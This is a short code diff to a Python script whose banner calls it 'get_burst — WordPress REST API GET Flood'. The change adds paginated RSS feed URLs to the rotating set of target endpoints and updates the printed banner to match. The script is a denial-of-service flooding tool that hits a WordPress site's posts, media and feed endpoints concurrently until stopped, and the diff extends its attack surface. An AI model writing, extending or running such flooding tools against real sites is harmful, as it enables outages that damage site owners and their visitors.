@@ -29,6 +29,9 @@ ENDPOINTS = [
     BASE + "/wp-json/wp/v2/posts?per_page=100&page=2",
     BASE + "/wp-json/wp/v2/posts?per_page=100&_embed=1",
     BASE + "/wp-json/wp/v2/media?per_page=100&page=2",
+    BASE + "/feed/?paged=1",
+    BASE + "/feed/?paged=2",
+    BASE + "/feed/?paged=3",
 ]
 
 HEADERS = {
@@ -80,7 +83,7 @@ print(f"\n{B}{'='*68}{W}")
 print(f"  get_burst — WordPress REST API GET Flood")
 print(f"{'='*68}")
 print(f"  Target      : {BASE}")
-print(f"  Endpoints   : {len(ENDPOINTS)} rotating (posts/media/comments)")
+print(f"  Endpoints   : {len(ENDPOINTS)} rotating (posts/media/comments/feed)")
 print(f"  Concurrency : {args.concurrency}")
 print(f"  Mode        : Continuous until Ctrl+C")
 print(f"{B}{'='*68}{W}\n")
